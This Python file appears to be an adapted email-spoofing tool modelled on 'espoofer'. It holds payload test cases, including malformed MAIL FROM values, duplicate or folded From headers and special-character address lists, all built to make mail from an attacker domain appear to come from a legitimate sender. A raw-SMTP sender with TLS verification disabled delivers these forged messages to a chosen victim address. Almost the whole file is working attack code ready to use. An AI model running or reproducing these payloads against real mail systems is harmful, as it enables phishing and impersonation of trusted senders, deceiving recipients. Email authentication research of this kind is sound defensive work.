import time
import socket
import ssl
import base64
import random
import string
from io import StringIO

def bs64encode(value):
    return b"=?utf-8?B?" + base64.b64encode(value) + b"?="

def id_generator(size=6):
    chars=string.ascii_uppercase + string.digits
    return (''.join(random.choice(chars) for _ in range(size))).encode("utf-8")

def get_date():
    from time import gmtime, strftime
    mdate = strftime("%a, %d %b %Y %H:%M:%S +0000", gmtime())
    return (mdate).encode("utf-8")

def recursive_fixup(data, old, new):
    if isinstance(data, dict):
        items = list(data.items())
    elif isinstance(data, (list, tuple)):
        items = enumerate(data)
    else:
        if isinstance(data, bytes) and isinstance(old, bytes) and isinstance(new, bytes):
            return data.replace(old, new)
        return data

    for key, value in items:
        data[key] = recursive_fixup(value, old, new)
    return data

test_cases = {
    "server_a1": {
        "helo": b"helo.attack.com",
        "mailfrom": b"<any@mailfrom.notexist.legitimate.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A1: Non-existent subdomain\r\n",
            "body": b"Hi, this is a test message!\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <153808.' + id_generator() + b'@attack.com>\r\n\r\n',
        },
    },
    "server_a2": {
        "helo": b"attack.com",
        "mailfrom": b"<(any@legitimate.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A2: empty MAIL FROM address\r\n",
            "body": b"Hi, this is a test message!\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <153808.' + id_generator() + b'@attack.com>\r\n\r\n',
        },
    },
    "server_a8": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b"From: <first@attack.com>\r\nFrom: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A8: Multiple From headers\r\n",
            "body": b"Hi, this is a test message!\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <153808.' + id_generator() + b'@attack.com>\r\n\r\n',
        },
    },
    "server_a9": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b" From: <first@attack.com>\r\nFrom: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A9: Multiple From headers with preceding space\r\n",
            "body": b"Hi, this is a test message!\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <153808.' + id_generator() + b'@attack.com>\r\n\r\n',
        },
    },
    "server_a11": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b"From\r\n : <first@attack.com>\r\nFrom: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A11: Multiple From headers with folding line\r\n",
            "body": b"Hi, this is a test message!\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <153808.' + id_generator() + b'@attack.com>\r\n\r\n',
        },
    },
    "server_a18": {
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b"From: admin@legitimate.com,<second@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: A18: Specical characters precedence\r\n",
            "body": b"Hi, this is a test message!\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <s@sender.legitimate.com>\r\nContent-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <153808.' + id_generator() + b'@attack.com>\r\n\r\n',
        },
    },
    "client_a1": {
        "helo": b"espoofer-client.local",
        "mailfrom": b"<attacker@example.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b"From: <attacker@example.com>\r\nFrom: <admin@example.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: client A1: Multiple From headers\r\n",
            "body": b"Hi, this is a test message!\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <153808.' + id_generator() + b'@attack.com>\r\n\r\n',
        },
    }
}

class MailSender(object):
    def __init__(self):
        self.mail_server = None
        self.rcpt_to = b""
        self.email_data = b""
        self.helo = b""
        self.mail_from = b""
        self.starttls = False

        self.client_socket = None
        self.tls_socket = None
        
        self.mode = "server"
        self.username = b""
        self.password = b""
        self.auth_proto = "LOGIN"

    def set_param(self, mail_server, rcpt_to, email_data, helo, mail_from, starttls=False, mode="server", username=None, password=None, auth_proto="LOGIN"):
        self.mail_server = mail_server
        self.rcpt_to = rcpt_to
        self.email_data = email_data
        self.helo = helo
        self.mail_from = mail_from
        self.starttls = starttls

        self.mode = mode
        self.username = username
        self.password = password
        self.auth_proto = auth_proto

    def establish_socket(self):
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.settimeout(10)
        client_socket.connect(self.mail_server)
        self.read_recv_msg(client_socket)

        if self.starttls:
            client_socket.send(b"ehlo " + self.helo + b"\r\n")
            self.read_recv_msg(client_socket)

            client_socket.send(b"starttls\r\n")
            self.read_recv_msg(client_socket)

            tls_context = ssl.create_default_context()
            tls_context.check_hostname = False
            tls_context.verify_mode = ssl.CERT_NONE
            tls_socket = tls_context.wrap_socket(client_socket, server_hostname=self.mail_server[0])
            self.tls_socket = tls_socket

        self.client_socket = client_socket

    def send_smtp_cmds(self, sock):
        sock.send(b"ehlo " + self.helo + b"\r\n")
        time.sleep(0.1)
        recv_msg = self.read_recv_msg(sock)

        if self.mode == "client" and self.username and self.password:
            if "LOGIN".lower() in recv_msg.lower() and self.auth_proto == "LOGIN":
                auth_username = b"AUTH LOGIN " + base64.b64encode(self.username) + b"\r\n"
                sock.send(auth_username)
                self.read_recv_msg(sock)
        
                auth_pwd = base64.b64encode(self.password) + b"\r\n"
                sock.send(auth_pwd)
                self.read_recv_msg(sock)
            else:
                auth_msg = b'AUTH PLAIN ' + base64.b64encode(b'\x00' + self.username + b'\x00' + self.password) + b'\r\n'
                sock.send(auth_msg)
                self.read_recv_msg(sock)

        sock.send(b'mail from: ' + self.mail_from + b'\r\n')
        time.sleep(0.1)
        self.read_recv_msg(sock)

        sock.send(b"rcpt to: " + self.rcpt_to + b"\r\n")
        time.sleep(0.1)
        self.read_recv_msg(sock)

        sock.send(b"data\r\n")
        time.sleep(0.1)
        self.read_recv_msg(sock)

        sock.send(self.email_data + b"\r\n.\r\n")
        time.sleep(0.1)
        res = self.read_recv_msg(sock)
        if "250" not in res and "queued" not in res.lower() and "ok" not in res.lower():
            raise Exception("Message rejected: " + res)

    def send_quit_cmd(self, sock):
        sock.send(b"quit\r\n")
        self.read_recv_msg(sock)

    def close_socket(self):
        if self.tls_socket:
            self.tls_socket.close()
        if self.client_socket:
            self.client_socket.close()

    def read_line(self, sock):
        buff = StringIO()
        while True:
            data = sock.recv(1).decode("utf-8", errors="ignore")
            if not data:
                break
            buff.write(data)
            if '\n' in data: break
        val = buff.getvalue()
        if not val:
            return ""
        return val.splitlines()[0]

    def read_recv_msg(self, sock):
        msg = ""
        while True:
            line = self.read_line(sock)
            msg += line + "\n"
            if "-" not in line:
                break
            else:
                if len(line) > 5 and "-" not in line[:5]:
                    break
        return msg

    def send_email(self):
        self.establish_socket()
        try:
            sock = self.tls_socket if self.starttls else self.client_socket
            self.send_smtp_cmds(sock)
            self.send_quit_cmd(sock)
        except Exception as e:
            self.close_socket()
            raise e
        self.close_socket()

import copy

def send_espoofer_payload(payload_id, smtp_server, smtp_port, username, password, from_email, to_email, subject, body):
    if payload_id not in test_cases:
        raise Exception(f"Payload {payload_id} not found.")

    case_data = copy.deepcopy(test_cases[payload_id])
    
    # Setup basic inputs as bytes
    b_attacker = username.encode("utf-8") if username else b"attacker@attack.com"
    b_legitimate = from_email.encode("utf-8")
    b_victim = to_email.encode("utf-8")
    
    # Try to extract domains
    attacker_domain = b_attacker.split(b"@")[1] if b"@" in b_attacker else b"attack.com"
    legitimate_domain = b_legitimate.split(b"@")[1] if b"@" in b_legitimate else b"legitimate.com"
    
    mode = "client" if payload_id.startswith("client_") else "server"

    if mode == "client":
        case_data = recursive_fixup(case_data, b"attacker@example.com", b_attacker)
        case_data = recursive_fixup(case_data, b"admin@example.com", b_legitimate)
        case_data = recursive_fixup(case_data, b"victim@victim.com", b_victim)
    else:
        case_data = recursive_fixup(case_data, b"attack.com", attacker_domain)
        case_data = recursive_fixup(case_data, b"admin@legitimate.com", b_legitimate)
        case_data = recursive_fixup(case_data, b"legitimate.com", legitimate_domain)
        case_data = recursive_fixup(case_data, b"victim@victim.com", b_victim)

    msg_content = case_data["data"]
    
    if subject:
        msg_content["subject_header"] = b"Subject: " + subject.encode("utf-8") + b"\r\n"
    if body:
        msg_content["body"] = body.encode("utf-8") + b"\r\n"

    raw_msg = msg_content["from_header"] + msg_content["to_header"] + msg_content["subject_header"] + msg_content["other_headers"] + msg_content["body"]

    sender = MailSender()
    # We default STARTTLS to true for standard ports using credentials
    starttls = True if smtp_port in [587, 25, 2525] else False
    
    sender.set_param(
        mail_server=(smtp_server, smtp_port),
        helo=case_data["helo"],
        mail_from=case_data["mailfrom"],
        rcpt_to=case_data["rcptto"],
        email_data=raw_msg,
        starttls=starttls,
        mode="client", # Use client mode with auth if we have credentials
        username=username.encode("utf-8") if username else None,
        password=password.encode("utf-8") if password else None
    )
    
    sender.send_email()
